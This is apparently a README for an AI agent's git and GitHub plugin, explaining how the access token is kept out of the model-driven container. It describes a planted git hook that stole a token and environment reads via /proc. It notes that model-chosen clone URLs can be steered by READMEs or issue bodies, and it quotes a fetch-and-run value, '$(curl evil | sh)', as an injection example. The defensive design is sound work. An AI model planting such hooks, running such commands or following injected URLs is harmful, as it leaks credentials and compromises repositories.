# `@loopingai/plugins/repo`

Clone, commit, push a work branch, open a pull request.

```ts
import { repo } from "@loopingai/plugins/repo";
import { computerExec } from "@loopingai/plugins/computer";

repo({
  // Runs in the container. Never given a credential.
  exec: computerExec({ binding: env.WORKSPACE, workspaceName: () => name }),
  // Runs wherever you keep your secret. Clone, fetch and push only.
  git: workspaceGit({ binding: env.WORKSPACE }),
  token: () => env.GITHUB_TOKEN
});
```

Tools: `repo_clone`, `repo_status`, `repo_diff`, `repo_commit`, `repo_push`,
`repo_open_pr`, `repo_issue_view`, `repo_pr_view`, `repo_pr_comment`.

The last three are the ones a model reaches for `gh` to do — read an issue, check
a pull request, leave a comment. They are here rather than in the container for
the same reason `repo_open_pr` is: installing a CLI and giving it a token would
hand that token to the shell the model drives. They resolve the repository from
the checkout's own origin, so they add no new model input to validate and no new
way to point the credential somewhere nobody asked about.

Two injected dependencies, and the line between them is the trust boundary rather
than a matter of taste. `exec` is anything that runs a command in the container —
[`/computer`](../computer/)'s `computerExec` is one such thing, and injecting it
keeps the two plugins independent, so a host with its own container can use this
against that and the tests here need no container at all. `git` is the other side:
the three operations that talk to the forge, run by the host, with the credential
never crossing over. See below for why that split exists.

## Where the token lives

Not in the container. Not for a moment, not in one command, not in one process's
environment.

That is one sentence where there used to be four rules, and the history is worth
keeping, because it is why the sentence is worded so absolutely.

**What went wrong.** Git is a general-purpose command runner: it executes what
`.git/config` and `.git/hooks` tell it to, both live in the workspace filesystem,
and a co-installed shell tool can write them. A planted `pre-push` hook ran on an
ordinary `repo_push` and read the token straight out of the environment it
inherited. Patching that key by key does not work either — a URL-specific
`http.<url>.sslVerify=false` in the repository's own config beats a `-c`
override, because specificity outranks precedence.

**What was tried.** `clone`, `fetch` and `push` moved into a bare git dir created
per operation, built, configured and used inside a single command, reaching the
checkout's objects through an alternates file so nothing was copied. It worked,
and it was about three hundred lines. What it could not close is that for the
length of one command the token was still in a process's environment, on a
filesystem the model has root on — and `/proc/<pid>/environ` needs no git at all.

**What is true now.** Those three operations do not run in the container. They go
to the injected `git`, which the host implements on its own side of the boundary.
The coder in `looping-starter` runs isomorphic-git inside the Durable Object that
owns the workspace filesystem — the same files the container mounts, reached
without a shell. No hooks, no `ext::` transport, no template directory, no
credential helpers. There is nothing to plant and no environment to read.

Everything else still runs in the container through `exec`, because none of it
needs to authenticate: `status`, `diff`, `add`, `commit`, `checkout`. That is the
whole rule for changing this plugin — an operation that talks to the forge does
not belong on `exec`, and one that does not has no business anywhere else.

Two things survive the move, because neither was ever about the container:

- **Never offered to a host you did not allow.** The clone URL is model input: a
  repository README, an issue body, or a page a co-installed browser plugin
  fetched is enough to choose it. So the URL's host must be on `allowedHosts`
  (default: `github.com`) before anything runs at all, and the allowlist travels
  with every call so the host can bind the check to the moment the credential
  would actually be handed over — which is also the only check that sees a host
  arrived at by redirect. `origin` is re-derived and re-checked on every push
  rather than remembered, because the checkout's `.git/config` is a file the
  container can rewrite.
- **Pull requests are opened from the Worker.** The GitHub REST call happens on
  the Worker side, so the credential that can write to the repository through the
  API never crosses into the container either.

Model-authored values — URLs, branch names, commit messages — still reach the
container as environment variables rather than being interpolated into a command,
so a branch name of `$(curl evil | sh)` is inert text. That is about shell
injection rather than credentials, and it is unchanged by any of the above.

What remains is not zero, and it is worth naming precisely:

- **The token's reach is the token's own.** This plugin checks the _host_ a clone
  or push may target, never the repository — so whatever the credential can read
  or write, an agent that is talked into naming it can reach. That is deliberate:
  a repository allowlist here would block legitimate work like filing a pull
  request against a dependency. It does mean the `GITHUB_TOKEN` should be
  fine-grained and scoped to what the agent is actually for, because nothing
  below it will narrow it further.
- **The host is now trusted with the credential**, which is the point, but it
  moves the question rather than deleting it. A host that implements `git` by
  shelling out inside the container has undone all of the above and this plugin
  cannot tell.

## Guardrails are in the tool, not the prompt

`repo_push` refuses, before running anything, in three layers — a guardrail a
model can talk itself out of is not a guardrail:

1. **Anything that is not a plain branch name.** `git push origin <name>` reads
   `<name>` as a _refspec_, so `+x:main` is a force push to main and `x:main` an
   ordinary one — neither of which a list of forbidden names ever sees, because
   it only compares literal strings.
2. **`main`, `master`, `trunk`, `develop`.**
3. **The repository's own default branch**, read from the remote. A repo whose
   trunk is `release` deserves the same protection, and only the remote can say.

It then refuses a fourth thing, after switching to the branch: **a branch with no
commits the default branch does not already have.** Pushing one succeeds,
`repo_open_pr` opens an empty pull request on it, and the round reports a URL as
if the work had landed — the one outcome worse than an error.

`repo_push` **switches to** an existing branch and only creates a missing one. It
used to use `git checkout -B`, which is create-or-_reset_, and that destroyed a
real commit: a model committed, saved the commit with `git branch coder/x`, then
went back to the default branch and reset — and `checkout -B` force-moved
`coder/x` back to where HEAD now was.

`repo_clone` is re-entrant, because a container that outlives its task comes back
with the checkout still in it. It fetches and resets a clean one, and **refuses a
dirty one** rather than resetting over the top: those changes are a previous
task's work, and discarding them is the one outcome nobody can undo.

It also refuses a URL that names no repository — `.../tree/main`, `.../pull/4`,
what a model copies out of a browser. That used to clone into `/workspace/repo`
without firing `beforeCheckout`, so a host keying its filesystem per repository
never switched and the checkout landed in whichever one was already open. The
refusal says what to send instead, which costs a turn and no guessing.

## When the container is not there

`exec` does not only return failures, it throws them: `@cloudflare/computer`
throws when a container is replaced mid-command, and a Durable Object call can
fail outright. None of that reaches the model as a tool error — it is caught
where the command is run and comes back through each tool's own failure
sentence, so `repo_status` says it could not read the status and `repo_push`
says the push did not go, each carrying what a replaced container actually
means: nothing finished, the checkout is durable and untouched, and retrying is
safe because these commands push one specific commit and never force.

The distinction that costs something if you get it wrong is between a command
that **answered no** and one that **never ran**. Three places here read a failure
as an answer — "no checkout in this directory", "no such branch", "no default
branch to protect" — and a container that vanished must not be read as any of
them. A replaced container is exactly the case where the next command lands on a
working replacement, so a probe misread as "empty directory" would send `git
clone` at a checkout that is already there.

## Output is bounded

Every tool truncates from the middle at `maxOutputBytes` (16 KB by default), the
same way `sb_exec` does. `repo_diff` also takes `stat: true` for a per-file
changed-line summary — the right first call on a large change, and the only
practical one for an agent whose entire view of the work is the diff.

## Requirements

A `GITHUB_TOKEN` secret with contents + pull-request write, a container with
`git` on it for the local half, and a `git` implementation on the host's side for
the three operations that authenticate.
